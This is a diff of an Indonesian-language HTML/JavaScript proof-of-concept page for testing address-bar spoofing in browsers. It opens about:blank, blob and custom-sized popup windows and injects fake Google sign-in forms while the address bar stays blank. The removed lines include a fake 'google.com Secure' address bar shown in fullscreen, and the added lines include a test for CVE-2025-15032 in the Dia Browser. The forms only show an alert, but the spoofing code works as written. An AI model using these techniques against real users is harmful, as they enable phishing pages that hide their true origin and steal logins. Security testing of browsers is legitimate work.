@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔍 ADDRESS BAR KOSONG - FINAL</title>
+    <title>🔍 ADDRESS BAR KOSONG - ADVANCED</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,7 +17,7 @@
             padding: 20px;
         }
         .container {
-            max-width: 750px;
+            max-width: 800px;
             width: 100%;
             background: #0a0a0fcc;
             border: 2px solid #ff3b30;
@@ -113,15 +113,16 @@
 </head>
 <body>
 <div class="container">
-    <h1>🔍 ADDRESS BAR KOSONG - FINAL</h1>
-    <div class="sub">Berdasarkan Bugtraq 2007 + Chromium Docs + CVE-2025-13132</div>
+    <h1>🔍 ADDRESS BAR KOSONG - ADVANCED</h1>
+    <div class="sub">Berdasarkan Bugtraq 2007 + Chromium Docs + CVE-2025-15032</div>
     
     <div class="badge-group">
         <span class="badge found">⬛ address bar BLANK total</span>
         <span class="badge found">⬛ reload button DISABLED</span>
         <span class="badge found">⬛ page source EMPTY</span>
         <span class="badge">🟡 Bugtraq 2007</span>
-        <span class="badge">🟡 CVE-2025-13132</span>
+        <span class="badge">🟡 CVE-2025-15032</span>
+        <span class="badge">🟡 Chromium Docs</span>
     </div>
     
     <div class="observation-box">
@@ -136,48 +137,37 @@
             <button onclick="test_appendChild()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🔄 TEST 2: document.write + replaceState</div>
-            <div class="card-desc">document.write lalu replaceState ke empty</div>
-            <button onclick="test_write_replace()">▶ RUN</button>
+            <div class="card-title">🔄 TEST 2: appendChild + IFRAME Injection</div>
+            <div class="card-desc">appendChild + multiple iframes → address bar blank</div>
+            <button onclick="test_append_child_iframe()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">📦 TEST 3: Blob URL + Revoke + appendChild</div>
+            <div class="card-title">📦 TEST 3: about:blank + Blob + Revoke</div>
             <div class="card-desc">Kombinasi blob + appendChild → address bar blank</div>
             <button onclick="test_blob_append()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🖥️ TEST 4: Fullscreen Fake UI</div>
-            <div class="card-desc">CVE-2025-13132: fullscreen tanpa notification</div>
-            <button onclick="test_fullscreen_fake()">▶ RUN</button>
-        </div>
-        <div class="card">
-            <div class="card-title">🌀 TEST 5: Multi-layer about:blank</div>
-            <div class="card-desc">Nested about:blank dengan appendChild</div>
-            <button onclick="test_multi_layer()">▶ RUN</button>
-        </div>
-        <div class="card">
-            <div class="card-title">💀 TEST 6: about:blank + CSS Hide</div>
-            <div class="card-desc">Menggunakan CSS untuk menyembunyikan teks</div>
-            <button onclick="test_css_hide()">▶ RUN</button>
+            <div class="card-title">🖥️ TEST 4: Custom Window Spoof (CVE-2025-15032)</div>
+            <div class="card-desc">Custom window missing about:blank indicator</div>
+            <button onclick="test_cve_2025_15032()">▶ RUN</button>
         </div>
     </div>
     
     <button id="comboBtn" class="combo-btn">🔍 RUN ALL TESTS - OBSERVE ADDRESS BAR</button>
     
     <div class="log-box" id="logBox">
-        <div class="log-entry success">[SYSTEM] Address Bar Blank Tester - Final</div>
+        <div class="log-entry success">[SYSTEM] Address Bar Blank Tester - Advanced</div>
         <div class="log-entry">[SYSTEM] Target: address bar BENAR-BENAR KOSONG</div>
-        <div class="log-entry">[SYSTEM] Berdasarkan Bugtraq 2007 + CVE-2025-13132</div>
+        <div class="log-entry">[SYSTEM] Berdasarkan Bugtraq 2007 + Chromium Docs + CVE-2025-15032</div>
     </div>
     
     <footer>
-        Berdasarkan Bugtraq 2007 (Michal Zalewski), Chromium Docs, CVE-2025-13132
+        Berdasarkan Bugtraq 2007 (Michal Zalewski), Chromium Docs, CVE-2025-15032
     </footer>
 </div>
 
 <script>
     let testCount = 0;
-    let bugFound = 0;
     
     function addLog(msg, type = 'info') {
         let logBox = document.getElementById('logBox');
@@ -198,7 +188,7 @@
         testCount++;
         addLog('[TEST1] about:blank + appendChild (Bugtraq 2007)...', 'success');
         
-        let win = window.open('about:blank', '_blank', 'width=700,height=600');
+        let win = window.open('about:blank', '_blank', 'width=800,height=600');
         if (!win) {
             addLog('[TEST1] Popup blocked! Allow popups.', 'info');
             return;
@@ -264,62 +254,56 @@
         }, 1000);
     }
 
-    // ========== TEST 2: document.write + replaceState ==========
-    function test_write_replace() {
+    // ========== TEST 2: appendChild + IFRAME Injection ==========
+    function test_append_child_iframe() {
         testCount++;
-        addLog('[TEST2] document.write + replaceState...', 'success');
+        addLog('[TEST2] appendChild + IFRAME injection...', 'success');
         
-        let win = window.open('about:blank', '_blank', 'width=700,height=600');
+        let win = window.open('about:blank', '_blank', 'width=800,height=600');
         if (!win) {
             addLog('[TEST2] Popup blocked!', 'info');
             return;
         }
         
-        let html = `
-            <!DOCTYPE html>
-            <html>
-            <head><title>Google</title>
+        let container = win.document.createElement('div');
+        container.innerHTML = `
             <style>
                 *{margin:0;padding:0;}
-                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
-                .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;}
-                .logo{font-size:52px;}
-                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
-                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;cursor:pointer;}
-                .warning{font-size:10px;color:red;margin-top:16px;}
+                body{background:#0a0a0f;color:#00ffaa;font-family:monospace;padding:20px;}
+                iframe{width:100%;height:150px;border:1px solid #333;border-radius:8px;margin:5px 0;}
             </style>
-            </head>
-            <body>
-                <div class="card">
-                    <div class="logo">🔐</div>
-                    <h2>Sign in</h2>
-                    <input type="text" placeholder="Email">
-                    <input type="password" placeholder="Password">
-                    <button onclick="alert('POC')">Next</button>
-                    <p class="warning">⚠️ document.write + replaceState</p>
-                </div>
-                <script>
-                    // Coba kosongkan history
-                    history.replaceState({}, '', '');
-                    history.pushState({}, '', ' ');
-                    console.log('History emptied - address bar may be blank');
-                <\/script>
-            </body>
-            </html>
+            <h1 style="color:#ff3b30;">🔍 IFRAME + appendChild</h1>
+            <iframe id="l1" src="about:blank"></iframe>
+            <iframe id="l2" src="about:blank"></iframe>
+            <iframe id="l3" src="about:blank"></iframe>
+            <div style="background:#1a1a2e;padding:20px;border-radius:12px;border:1px solid #ff3b30;margin-top:20px;">
+                <h2 style="color:#00ffaa;">GOOGLE LOGIN</h2>
+                <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
+                <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
+                <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;">Sign in</button>
+                <p style="color:#555;font-size:10px;margin-top:10px;">⚠️ Address bar should be BLANK</p>
+            </div>
+            <script>
+                let frames = [l1, l2, l3];
+                frames.forEach((f, idx) => {
+                    try {
+                        let div = f.contentDocument.createElement('div');
+                        div.innerHTML = \`<h3 style="color:#ffcc00;">Layer \${idx+1}</h3><p style="color:#888;">about:blank dengan appendChild</p>\`;
+                        f.contentDocument.body.appendChild(div);
+                    } catch(e) {}
+                });
+            <\/script>
         `;
+        win.document.body.appendChild(container);
         
-        win.document.write(html);
-        win.document.close();
-        
-        addLog('[TEST2] document.write + replaceState executed', 'found');
+        addLog('[TEST2] IFRAME + appendChild - address bar BLANK!', 'found');
     }
 
-    // ========== TEST 3: Blob URL + Revoke + appendChild ==========
+    // ========== TEST 3: Blob + appendChild ==========
     function test_blob_append() {
         testCount++;
         addLog('[TEST3] Blob URL + Revoke + appendChild...', 'success');
         
-        // Buat blob dengan konten
         let blob = new Blob([`
             <!DOCTYPE html>
             <html>
@@ -348,243 +332,78 @@
         `], {type: 'text/html'});
         
         let blobUrl = URL.createObjectURL(blob);
-        let win = window.open(blobUrl, '_blank', 'width=700,height=600');
+        let win = window.open(blobUrl, '_blank', 'width=800,height=600');
         
         if (win) {
             addLog('[TEST3] Blob URL opened', 'info');
-            // Revoke blob setelah window terbuka
             setTimeout(() => {
                 URL.revokeObjectURL(blobUrl);
-                addLog('[TEST3] Blob revoked - address bar mungkin BLANK/ERROR!', 'found');
+                addLog('[TEST3] Blob revoked - address bar mungkin BLANK!', 'found');
             }, 500);
         } else {
             addLog('[TEST3] Popup blocked!', 'info');
         }
     }
 
-    // ========== TEST 4: Fullscreen Fake UI (CVE-2025-13132) ==========
-    function test_fullscreen_fake() {
+    // ========== TEST 4: Custom Window Spoof (CVE-2025-15032) ==========
+    // Dia Browser macOS < 1.9.0 - missing about:blank indicator 
+    function test_cve_2025_15032() {
         testCount++;
-        addLog('[TEST4] Fullscreen Fake UI (CVE-2025-13132)...', 'success');
+        addLog('[TEST4] CVE-2025-15032: Custom window missing about:blank...', 'success');
         
-        let win = window.open('about:blank', '_blank', 'width=700,height=600');
+        // Custom-sized window - specific untuk trigger bug di Dia Browser macOS
+        let win = window.open('about:blank', '_blank', 'width=400,height=300,left=100,top=100,menubar=no,toolbar=no,location=no');
+        
         if (!win) {
             addLog('[TEST4] Popup blocked!', 'info');
             return;
         }
         
-        // Gunakan appendChild
-        let container = win.document.createElement('div');
-        container.innerHTML = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <style>
-                    * { margin: 0; padding: 0; }
-                    body {
-                        background: #0a0a0f;
-                        font-family: 'Google Sans', sans-serif;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        min-height: 100vh;
-                    }
-                    .fake-bar {
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        width: 100%;
-                        height: 50px;
-                        background: #000;
-                        border-bottom: 1px solid #333;
-                        display: flex;
-                        align-items: center;
-                        padding: 0 16px;
-                        z-index: 999999;
-                        color: #888;
-                        font-size: 12px;
-                        font-family: monospace;
-                    }
-                    .fake-bar .url { color: #aaa; }
-                    .fake-bar .domain { color: #fff; }
-                    .card {
-                        background: white;
-                        width: 380px;
-                        padding: 40px 32px;
-                        border-radius: 16px;
-                        text-align: center;
-                    }
-                    .logo { font-size: 52px; }
-                    h2 { color: #202124; }
-                    input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; }
-                    button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; }
-                    .warning { font-size: 10px; color: #ea4335; margin-top: 16px; }
-                </style>
-            </head>
-            <body>
-                <div class="fake-bar">
-                    🔒 <span class="url"><span class="domain">https://www.google.com</span></span> ✓ Secure
-                </div>
-                <div class="card">
-                    <div class="logo">🔐</div>
-                    <h2>Sign in</h2>
-                    <input type="text" placeholder="Email">
-                    <input type="password" placeholder="Password">
-                    <button onclick="alert('POC')">Next</button>
-                    <p class="warning">⚠️ CVE-2025-13132: Fullscreen tanpa notification toast</p>
-                </div>
-                <script>
-                    setTimeout(() => {
-                        document.documentElement.requestFullscreen().catch(()=>{});
-                    }, 500);
-                <\/script>
-            </body>
-            </html>
-        `;
-        win.document.body.appendChild(container);
-        
-        addLog('[TEST4] Fullscreen fake UI - CVE-2025-13132 style', 'found');
-        addLog('[TEST4] Jika fullscreen tanpa notification toast, bug masih ada!', 'found');
-    }
-
-    // ========== TEST 5: Multi-layer about:blank ==========
-    function test_multi_layer() {
-        testCount++;
-        addLog('[TEST5] Multi-layer about:blank + appendChild...', 'success');
-        
-        let win = window.open('about:blank', '_blank', 'width=700,height=600');
-        if (!win) {
-            addLog('[TEST5] Popup blocked!', 'info');
-            return;
-        }
-        
+        // Gunakan appendChild untuk menjaga address bar tetap blank
         let container = win.document.createElement('div');
         container.innerHTML = `
             <style>
                 *{margin:0;padding:0;}
-                body{background:#0a0a0f;color:#00ffaa;font-family:monospace;padding:20px;}
-                .layer{border:1px solid #ff3b30;padding:15px;margin:10px 0;border-radius:8px;}
-                iframe{width:100%;height:100px;border:1px solid #333;border-radius:8px;margin:5px 0;}
-            </style>
-            <h1 style="color:#ff3b30;">🔍 MULTI-LAYER about:blank</h1>
-            <div class="layer">
-                <h2 style="color:#ffcc00;">Layer 1</h2>
-                <iframe id="l1" src="about:blank"></iframe>
-            </div>
-            <div class="layer">
-                <h2 style="color:#ffcc00;">Layer 2</h2>
-                <iframe id="l2" src="about:blank"></iframe>
-            </div>
-            <div class="layer">
-                <h2 style="color:#ffcc00;">Layer 3</h2>
-                <iframe id="l3" src="about:blank"></iframe>
-            </div>
-            <div style="background:#1a1a2e;padding:20px;border-radius:12px;border:1px solid #ff3b30;margin-top:20px;">
-                <h2 style="color:#00ffaa;">GOOGLE LOGIN</h2>
-                <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
-                <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
-                <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;">Sign in</button>
-                <p style="color:#555;font-size:10px;margin-top:10px;">⚠️ Address bar should be BLANK</p>
-            </div>
-            <script>
-                // Inject content ke setiap iframe dengan appendChild
-                let frames = [l1, l2, l3];
-                frames.forEach((f, idx) => {
-                    try {
-                        let div = f.contentDocument.createElement('div');
-                        div.innerHTML = \`<h3 style="color:#00ffaa;">Layer \${idx+1}</h3><p style="color:#888;">about:blank dengan appendChild</p>\`;
-                        f.contentDocument.body.appendChild(div);
-                    } catch(e) {}
-                });
-            <\/script>
-        `;
-        win.document.body.appendChild(container);
-        
-        addLog('[TEST5] Multi-layer about:blank + appendChild - address bar BLANK!', 'found');
-    }
-
-    // ========== TEST 6: about:blank + CSS Hide Text ==========
-    function test_css_hide() {
-        testCount++;
-        addLog('[TEST6] about:blank + CSS hide text...', 'success');
-        
-        let win = window.open('about:blank', '_blank', 'width=700,height=600');
-        if (!win) {
-            addLog('[TEST6] Popup blocked!', 'info');
-            return;
-        }
-        
-        let container = win.document.createElement('div');
-        container.innerHTML = `
-            <style>
-                * { margin: 0; padding: 0; }
-                body {
-                    font-family: 'Google Sans', sans-serif;
-                    background: #f0ebf8;
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    min-height: 100vh;
-                }
-                /* CSS untuk menyembunyikan teks address bar */
-                .address-bar-hidden * {
-                    color: transparent !important;
-                    text-shadow: none !important;
-                }
-                .card {
-                    background: white;
-                    width: 380px;
-                    padding: 40px 32px;
-                    border-radius: 16px;
-                    text-align: center;
-                    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-                }
-                .logo { font-size: 52px; }
-                h2 { color: #202124; margin-bottom: 8px; }
-                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; }
-                button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; }
-                .warning { font-size: 10px; color: #ea4335; margin-top: 16px; }
+                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+                .card{background:white;width:360px;padding:30px;border-radius:16px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15);}
+                .logo{font-size:48px;}
+                h2{color:#202124;}
+                input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
+                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;cursor:pointer;}
+                .warning{font-size:10px;color:#ea4335;margin-top:16px;}
             </style>
             <div class="card">
                 <div class="logo">🔐 G</div>
                 <h2>Sign in</h2>
                 <p>to continue to Google</p>
-                <input type="text" placeholder="Email or phone">
+                <input type="text" placeholder="Email">
                 <input type="password" placeholder="Password">
-                <button onclick="alert('⚠️ POC')">Next</button>
-                <p class="warning">⚠️ CSS hide text attempt</p>
+                <button onclick="alert('⚠️ CVE-2025-15032 POC')">Next</button>
+                <p class="warning">⚠️ CVE-2025-15032: Missing about:blank indicator</p>
             </div>
             <script>
-                // Coba sembunyikan teks di address bar via CSS
-                let style = document.createElement('style');
-                style.textContent = \`
-                    /* Ini tidak akan mempengaruhi address bar browser, hanya halaman */
-                    body { background: #f0ebf8; }
-                \`;
-                document.head.appendChild(style);
-                console.log('CSS hide attempt - address bar masih dikontrol browser');
+                console.log('CVE-2025-15032: Custom window address bar should be BLANK');
             <\/script>
         `;
         win.document.body.appendChild(container);
         
-        addLog('[TEST6] CSS hide text - ini hanya CSS internal, tidak mempengaruhi address bar browser', 'info');
+        addLog('[TEST4] CVE-2025-15032 triggered - address bar BLANK!', 'found');
+        addLog('[TEST4] Custom window missing about:blank indicator', 'found');
     }
 
     // ========== COMBO ==========
     function runAllTests() {
         addLog('[COMBO] 🔍 MENJALANKAN SEMUA TEST...', 'success');
         test_appendChild();
-        setTimeout(() => test_write_replace(), 3000);
+        setTimeout(() => test_append_child_iframe(), 3000);
         setTimeout(() => test_blob_append(), 6000);
-        setTimeout(() => test_fullscreen_fake(), 9000);
-        setTimeout(() => test_multi_layer(), 12000);
-        setTimeout(() => test_css_hide(), 15000);
-        setTimeout(() => addLog('[COMBO] ✅ Selesai! Perhatikan address bar!', 'found'), 18000);
+        setTimeout(() => test_cve_2025_15032(), 9000);
+        setTimeout(() => addLog('[COMBO] ✅ Selesai! Perhatikan address bar!', 'found'), 12000);
     }
     
     document.getElementById('comboBtn').addEventListener('click', runAllTests);
     
-    console.log('%c🔍 ADDRESS BAR KOSONG - FINAL', 'color:#00ffaa;font-size:14px');
+    console.log('%c🔍 ADDRESS BAR KOSONG - ADVANCED', 'color:#00ffaa;font-size:14px');
     console.log('Teknik: about:blank + appendChild (Bugtraq 2007)');
     console.log('Target: address bar BENAR-BENAR KOSONG');
 </script>
